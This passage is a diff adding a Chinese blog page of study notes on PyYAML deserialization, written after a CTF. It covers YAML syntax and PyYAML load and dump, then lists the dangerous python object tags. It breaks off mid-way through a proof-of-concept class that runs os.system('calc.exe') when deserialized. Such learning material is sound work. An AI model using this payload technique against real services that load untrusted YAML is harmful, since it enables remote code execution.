@@ -1,0 +1,960 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>PyYaml反序列化 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Yaml"><span class="toc-number">2.</span> <span class="toc-text">Yaml</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">数据类型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PyYaml%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">PyYaml基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#load-%EF%BC%9A%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.1.</span> <span class="toc-text">load()：返回一个对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-all-%EF%BC%9A%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E8%BF%AD%E4%BB%A3%E5%99%A8"><span class="toc-number">3.2.</span> <span class="toc-text">load_all()：生成一个迭代器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml-dump-python%E5%AF%B9%E8%B1%A1%E8%BD%ACyaml%E6%96%87%E6%A1%A3"><span class="toc-number">3.3.</span> <span class="toc-text">yaml.dump:python对象转yaml文档</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PyYAML-lt-5-1"><span class="toc-number">4.</span> <span class="toc-text">PyYAML &lt; 5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%E8%BD%AC%E5%8C%96"><span class="toc-number">4.1.</span> <span class="toc-text">标签转化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py-x2F-object"><span class="toc-number">4.2.</span> <span class="toc-text">!!py&#x2F;object</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">4.2.1.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py-x2F-module"><span class="toc-number">4.3.</span> <span class="toc-text">!!py&#x2F;module</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-x2F-name"><span class="toc-number">4.4.</span> <span class="toc-text">!!python&#x2F;name</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-2"><span class="toc-number">4.4.1.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">4.5.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PyYAML-gt-x3D-5-1"><span class="toc-number">5.</span> <span class="toc-text">PyYAML &gt;&#x3D; 5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E2%89%A4-version-lt-5-2"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 ≤ version &lt; 5.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%9E%84%E9%80%A0%E5%99%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">指定构造器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-FullConstructor-%E4%B8%8B%E5%BC%95%E5%85%A5%E7%B1%BB"><span class="toc-number">5.1.2.</span> <span class="toc-text">在 FullConstructor 下引入类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#map"><span class="toc-number">5.1.3.</span> <span class="toc-text">map</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listitems-%E8%A7%A6%E5%8F%91-extend"><span class="toc-number">5.1.4.</span> <span class="toc-text">listitems 触发 extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#state-%E8%A7%A6%E5%8F%91"><span class="toc-number">5.1.5.</span> <span class="toc-text">state 触发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#setstate"><span class="toc-number">5.1.5.1.</span> <span class="toc-text">__setstate__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#update"><span class="toc-number">5.1.5.2.</span> <span class="toc-text">update</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#version-gt-x3D-5-2"><span class="toc-number">5.2.</span> <span class="toc-text">version &gt;&#x3D; 5.2</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>PyYaml反序列化</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/17
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00a596">反序列化</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/python/" style="color: #ff7d73">python</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Yaml/" style="color: #00bcd4">Yaml</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">3.4k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">15分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>填一下之前HDCTF的坑，对Yaml及Yaml反序列化进行学习</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://ph0ebus.cn/post/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://ph0ebus.cn/post/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7923#toc-3">https://xz.aliyun.com/t/7923#toc-3</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/16908">https://xz.aliyun.com/t/16908</a></p>
+<span id="more"></span>
+
+<h1 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/yaml-intro.html">菜鸟教程</a></p>
+<p>YAML是一种可读性高，用来表达数据<strong>序列化</strong>的格式</p>
+<p>后缀是.yml文件</p>
+<p><del>其实博客魔改多了对这个也不会太陌生</del></p>
+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul>
+<li>大小写敏感</li>
+<li>使用缩进表示层级关系</li>
+<li>缩进不允许使用tab，只允许空格</li>
+<li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li>
+<li>‘#’表示注释</li>
+<li>‘!!’表示强制类型转换，如强制转化为str类型就是<code>!!str</code></li>
+</ul>
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
+<li><p>对象：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hashes） &#x2F; 字典（dictionary）</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">key</span><span class="token punctuation">:</span> 
+    <span class="token key atrule">child-key</span><span class="token punctuation">:</span> value
+    <span class="token key atrule">child-key2</span><span class="token punctuation">:</span> value2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>数组：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">-</span> A
+<span class="token punctuation">-</span> B
+<span class="token punctuation">-</span> C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>纯量（scalars）：单个的、不可再分的值</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">boolean</span><span class="token punctuation">:</span> 
+    <span class="token punctuation">-</span> <span class="token boolean important">TRUE</span>  <span class="token comment">#true,True都可以</span>
+    <span class="token punctuation">-</span> <span class="token boolean important">FALSE</span>  <span class="token comment">#false，False都可以</span>
+<span class="token key atrule">float</span><span class="token punctuation">:</span>
+    <span class="token punctuation">-</span> <span class="token number">3.14</span>
+    <span class="token punctuation">-</span> <span class="token number">6.8523015e+5</span>  <span class="token comment">#可以使用科学计数法</span>
+<span class="token key atrule">int</span><span class="token punctuation">:</span>
+    <span class="token punctuation">-</span> <span class="token number">123</span>
+    <span class="token punctuation">-</span> 0b1010_0111_0100_1010_1110    <span class="token comment">#二进制表示</span>
+<span class="token key atrule">null</span><span class="token punctuation">:</span>
+    <span class="token key atrule">nodeName</span><span class="token punctuation">:</span> <span class="token string">'node'</span>
+    <span class="token key atrule">parent</span><span class="token punctuation">:</span> <span class="token null important">~</span>  <span class="token comment">#使用~表示null</span>
+<span class="token key atrule">string</span><span class="token punctuation">:</span>
+    <span class="token punctuation">-</span> 哈哈
+    <span class="token punctuation">-</span> <span class="token string">'Hello world'</span>  <span class="token comment">#可以使用双引号或者单引号包裹特殊字符</span>
+    <span class="token punctuation">-</span> newline
+      newline2    <span class="token comment">#字符串可以拆成多行，每一行会被转化成一个空格</span>
+<span class="token key atrule">date</span><span class="token punctuation">:</span>
+    <span class="token punctuation">-</span> <span class="token datetime number">2018-02-17</span>    <span class="token comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span>
+<span class="token key atrule">datetime</span><span class="token punctuation">:</span> 
+    <span class="token punctuation">-</span>  <span class="token datetime number">2018-02-17T15:02:31+08:00</span>    <span class="token comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<hr>
+<h1 id="PyYaml基本使用"><a href="#PyYaml基本使用" class="headerlink" title="PyYaml基本使用"></a>PyYaml基本使用</h1><p>安装PyYAML</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> PyYAML<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="load-：返回一个对象"><a href="#load-：返回一个对象" class="headerlink" title="load()：返回一个对象"></a>load()：返回一个对象</h2><blockquote>
+<p>这个过程就被称为<strong>反序列化</strong></p>
+</blockquote>
+<p>新建一个config.yml文件</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> Tom Smith
+<span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">37</span>
+<span class="token key atrule">spouse</span><span class="token punctuation">:</span>
+    <span class="token key atrule">name</span><span class="token punctuation">:</span> Jane Smith
+    <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">25</span>
+<span class="token key atrule">children</span><span class="token punctuation">:</span>
+ <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Jimmy Smith
+   <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">15</span>
+ <span class="token punctuation">-</span> <span class="token key atrule">name1</span><span class="token punctuation">:</span> Jenny Smith
+   <span class="token key atrule">age1</span><span class="token punctuation">:</span> <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同个文件夹下新建一个test.py</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'config.yml'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
+y <span class="token operator">=</span> yaml<span class="token punctuation">.</span>safe_load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>（注：从 PyYAML 5.1 版本开始，<code>yaml.load()</code> 函数的默认行为已更改，它不再支持加载任意 Python 对象。如果你要加载未知来源的 YAML 数据，建议使用 <code>yaml.safe_load()</code> 函数，它会加载安全的 Python 基本类型（如 dict、list、str、int、float、bool 和 NoneType））</p>
+<p>执行结果：</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230617122758754.png" alt="image-20230617122758754"></p>
+<h2 id="load-all-：生成一个迭代器"><a href="#load-all-：生成一个迭代器" class="headerlink" title="load_all()：生成一个迭代器"></a>load_all()：生成一个迭代器</h2><p>如果string或文件包含几块yaml文档，你可以使用yaml.load_all来解析全部的文档</p>
+<h2 id="yaml-dump-python对象转yaml文档"><a href="#yaml-dump-python对象转yaml文档" class="headerlink" title="yaml.dump:python对象转yaml文档"></a>yaml.dump:python对象转yaml文档</h2><blockquote>
+<p>这个过程就被称为<strong>序列化</strong></p>
+</blockquote>
+<p>新建一个dump.py</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+aproject <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Silenthand Olleander'</span><span class="token punctuation">,</span>
+            <span class="token string">'race'</span><span class="token punctuation">:</span> <span class="token string">'Human'</span><span class="token punctuation">,</span>
+            <span class="token string">'traits'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'ONE_HAND'</span><span class="token punctuation">,</span> <span class="token string">'ONE_EYE'</span><span class="token punctuation">]</span>
+            <span class="token punctuation">&#125;</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>aproject<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行结果：</p>
+<p><img src="/blog/2023/06/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230617123202415.png" alt="image-20230617123202415"></p>
+<p>yaml.dump接收的第二个参数一定要是一个打开的文本文件或二进制文件，yaml.dump会把生成的yaml文档写到文件里</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+aproject <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Silenthand Olleander'</span><span class="token punctuation">,</span>
+            <span class="token string">'race'</span><span class="token punctuation">:</span> <span class="token string">'Human'</span><span class="token punctuation">,</span>
+            <span class="token string">'traits'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'ONE_HAND'</span><span class="token punctuation">,</span> <span class="token string">'ONE_EYE'</span><span class="token punctuation">]</span>
+            <span class="token punctuation">&#125;</span>
+f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dump.yml'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>aproject<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行后会生成dump.yml文件</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">name</span><span class="token punctuation">:</span> Silenthand Olleander
+<span class="token key atrule">race</span><span class="token punctuation">:</span> Human
+<span class="token key atrule">traits</span><span class="token punctuation">:</span>
+<span class="token punctuation">-</span> ONE_HAND
+<span class="token punctuation">-</span> ONE_EYE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>yaml.dump_all()</code>:多个段输出到一个文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+
+obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"James"</span><span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>
+obj2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Lily"</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">]</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'yaml_dump_all.yml'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    yaml<span class="token punctuation">.</span>dump_all<span class="token punctuation">(</span><span class="token punctuation">[</span>obj1<span class="token punctuation">,</span> obj2<span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行后生成yaml_dump_all.yml</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">20</span>
+<span class="token key atrule">name</span><span class="token punctuation">:</span> James
+<span class="token punctuation">---</span>
+<span class="token punctuation">-</span> Lily
+<span class="token punctuation">-</span> <span class="token number">19</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 5.1</h1><p>在上面测试的时候也发现了，<code>yaml.load()</code>函数已不可在5.1及以上版本直接使用</p>
+<p>那么我们以<code>PyYAML==4.2b4</code>这个版本来进行本地测试</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">PyYAML</span><span class="token operator">==</span><span class="token number">4</span>.2b4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="标签转化"><a href="#标签转化" class="headerlink" title="标签转化"></a>标签转化</h2><p>PyYaml下支持所有yaml标签转化为python对应类型，详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/pythoner/article/details/83389813">Yaml与python类型的对照表</a></p>
+<p>其中有五个强大的Complex Python tags支持转化为指定的python模块，类，方法以及对象实例</p>
+<table>
+<thead>
+<tr>
+<th>YAML tag</th>
+<th>Python tag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>!!python&#x2F;name:module.name</td>
+<td>module.name</td>
+</tr>
+<tr>
+<td>!!python&#x2F;module:package.module</td>
+<td>package.module</td>
+</tr>
+<tr>
+<td>!!python&#x2F;object:module.cls</td>
+<td>module.cls instance</td>
+</tr>
+<tr>
+<td>!!python&#x2F;object&#x2F;new:module.cls</td>
+<td>module.cls instance</td>
+</tr>
+<tr>
+<td>!!python&#x2F;object&#x2F;apply:module.f</td>
+<td>value of f(…)</td>
+</tr>
+</tbody></table>
+<br>
+
+<p>在PyYAML 5.1版本之前我们有以下反序列化方法：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+load<span class="token punctuation">(</span>data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>Loader<span class="token punctuation">)</span>
+load_all<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+load_all<span class="token punctuation">(</span>data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里进行本地测试(python&#x3D;3.10.8,PyYAML&#x3D;&#x3D;4.2b4)</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml
+<span class="token keyword">import</span> os
+
+<span class="token keyword">class</span> <span class="token class-name">poc</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'calc.exe'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>poc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__main__"</span><span class="token punctuation">,</span><span class="token string">"yaml_test"</span><span class="token punctuation">)</span>
